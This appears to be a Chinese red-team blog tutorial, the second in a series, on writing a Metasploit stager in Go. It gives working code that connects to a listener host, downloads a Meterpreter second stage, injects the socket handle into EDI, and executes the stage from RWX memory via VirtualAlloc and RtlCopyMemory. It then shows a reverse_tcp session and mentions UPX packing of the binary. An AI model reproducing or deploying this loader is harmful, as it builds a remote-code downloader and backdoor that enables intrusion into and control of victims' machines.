---
title: msf stagers开发不完全指北(二)
date: 2020-06-28 13:40:00
tags:
- msf
- 红队
- 工具
categories:
- 开发
---

# 采用 Golang 开发stagers

<!--more-->

上一篇文章 [msf stagers开发不完全指北(一)](https://www.cnblogs.com/Akkuman/p/13183702.html)中我们谈到如何采用 c 进行 msf 的 stagers 开发，这篇文章我们探讨一下如何使用 Golang 实现同样的功能



## 思路梳理

在 Golang 中一点比较重要的是，我们如何能够获取到 socket 的文件描述符，除此之外，我们还是同样的步骤

1. 向 msf 监听地址发起 tcp 请求
2. 获取 stages
3. 将 socket fd 放入寄存器 edi
4. 从起始地址开始执行 stages

## 编译环境

- OS: Windows 10

- Golang: go version go1.14.1 windows/amd64

### 获取stages

```go
socket, err := net.Dial("tcp", "192.168.174.136:4444")
if err != nil {
    return err
}

// read payload size
var payloadSizeRaw = make([]byte, 4)
numOfBytes, err := socket.Read(payloadSizeRaw)
if err != nil {
	return err
}
if numOfBytes != 4 {
    return errors.New("Number of size bytes was not 4! ")
}
payloadSize := int(binary.LittleEndian.Uint32(payloadSizeRaw))

// read payload
var payload = make([]byte, payloadSize)
// numOfBytes, err = socket.Read(payload)
numOfBytes, err = io.ReadFull(socket, payload)
if err != nil {
    return err
}
if numOfBytes != payloadSize {
    return errors.New("Number of payload bytes does not match payload size! ")
}
```

这里有几点我们需要注意的地方，第一是读取stages长度是需要使用 binary 库把它转化为 int32，你可以理解为 python 中的 struct 库，第二个是我们惯用的从 socket 连接读取数据使用的是 Read，但是并不能读全，和网络有关系，需要使用 ReadFull 或者 ReadAtLeast 进行读取。读取到 stages 后，我们可以进行下一步操作了。

### socket fd 放入 edi

```go
conn := socket.(*net.TCPConn)
fd := reflect.ValueOf(*conn).FieldByName("fd")
handle := reflect.Indirect(fd).FieldByName("pfd").FieldByName("Sysfd")
socketFd := *(*uint32)(unsafe.Pointer(handle.UnsafeAddr()))

buff := make([]byte, 4)
binary.LittleEndian.PutUint32(buff, socketFd)
return buff
```

这部分代码就是我上面所说的难点了，首先 `socket, err := net.Dial("tcp", "192.168.174.136:4444")` 返回的是一个接口 `type Conn interface` ，我们需要找到他的真实类型，继续往里面跟我们会发现他的真实类型是 `*net.TCPConn`，为什么要做这一步？

我们先看看这个结构体

```go
// TCPConn is an implementation of the Conn interface for TCP network
// connections.
type TCPConn struct {
	conn
}

type conn struct {
	fd *netFD
}
```

我们其实需要的是里面的文件描述符，我们再往里跟一下

```go
// Network file descriptor.
type netFD struct {
	pfd poll.FD

	// immutable until Close
	family      int
	sotype      int
	isConnected bool // handshake completed or use of association with peer
	net         string
	laddr       Addr
	raddr       Addr
}

// poll.FD
// FD is a file descriptor. The net and os packages embed this type in
// a larger type representing a network connection or OS file.
type FD struct {
	// Lock sysfd and serialize access to Read and Write methods.
	fdmu fdMutex

	// System file descriptor. Immutable until Close.
	Sysfd syscall.Handle

	// Read operation.
	rop operation
	// Write operation.
	wop operation

	// I/O poller.
	pd pollDesc

	// Used to implement pread/pwrite.
	l sync.Mutex

	// For console I/O.
	lastbits       []byte   // first few bytes of the last incomplete rune in last write
	readuint16     []uint16 // buffer to hold uint16s obtained with ReadConsole
	readbyte       []byte   // buffer to hold decoding of readuint16 from utf16 to utf8
	readbyteOffset int      // readbyte[readOffset:] is yet to be consumed with file.Read

	// Semaphore signaled when file is closed.
	csema uint32

	skipSyncNotif bool

	// Whether this is a streaming descriptor, as opposed to a
	// packet-based descriptor like a UDP socket.
	IsStream bool

	// Whether a zero byte read indicates EOF. This is false for a
	// message based socket connection.
	ZeroReadIsEOF bool

	// Whether this is a file rather than a network socket.
	isFile bool

	// The kind of this file.
	kind fileKind
}
```

可以看到 `Sysfd` 是文件描述符，也就是我们想要的，我们需要取一下，这里因为 Golang 里面小写开头的字段是不导出的，我们需要使用反射取一下

**注意：可能因为 Golang 版本不一致，这个结构有所更改，请自行考证一下，主要原因是非导出字段，官方是不保证向下兼容性的**

所以获取文件描述符的代码就是

```go
fd := reflect.ValueOf(*conn).FieldByName("fd")
handle := reflect.Indirect(fd).FieldByName("pfd").FieldByName("Sysfd")
socketFd := *(*uint32)(unsafe.Pointer(handle.UnsafeAddr()))
```

文件描述符是 handle 所指向的值，这里需要**注意**一下

然后后面的还是我们之前的操作，使用 binary 包把 uint32 转为 4bytes 数组

然后我们需要把 socket fd 放入 edi

```go
payload = append(append([]byte{0xBF}, socketFD...), payload...)
```

把 `mov edi, xxxx` 放到了 stages 头部

## 执行stages

一切的准备工作都做完了，下面就是开始准备执行了，类似执行 shellcode 的方式，这里的实现方式八仙过海各显神通了，我这里只给我我这里的实现方式

```go
// modify payload to comply with the plan9 calling convention
payload = append(
    []byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57},
    append(
        payload,
        []byte{0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3}...,
    )...,
)
addr, _, err := virtualAlloc.Call(0, uintptr(len(payload)), 0x1000|0x2000, 0x40)
if addr == 0 {
    return err
}
RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&payload[0])), uintptr(len(payload)))
syscall.Syscall(address, 0, 0, 0, 0)
```

这里的一串奇奇怪怪的字符可以不用加，只是为了遵守 plan9 汇编的调用约定，一些 push 保存堆栈现场和 pop 还原

然后就是先通过申请 `VirtualAlloc` 一块可读可写可执行的内存，然后使用 `RtlCopyMemory` 把 stages 字节码拷贝进去，然后开始跑。

这里的 windows api 使用的声明如下

```go
var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	virtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)
```

这里其实你也可以使用 `x/windows` 库方便使用。

## 结果展示

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/6d4717de3cf8fbd19a19d72b671be134..png)

64位编译出来 1.73M，通过 upx 压缩后 616kb，32位编译出来会更小

执行试试

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/20892da00717ec56573de8a2d3d24854..png)

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/e528ffdc204111ba2d255bce27ddd648..png)

监听 payload windows/x64/meterpreter/reverse_tcp ，可以看到成功上线

## 注意事项

- **可能因为 Golang 版本不一致，这个结构有所更改，请自行考证一下，主要原因是非导出字段，官方是不保证向下兼容性的**
- **依然需要注意位数的差异，比如32位的payload请使用32位编译，64位payload使用64位编译**

## 成果源码

成果源码我就不贴出来了，其实也是这些代码组合在一起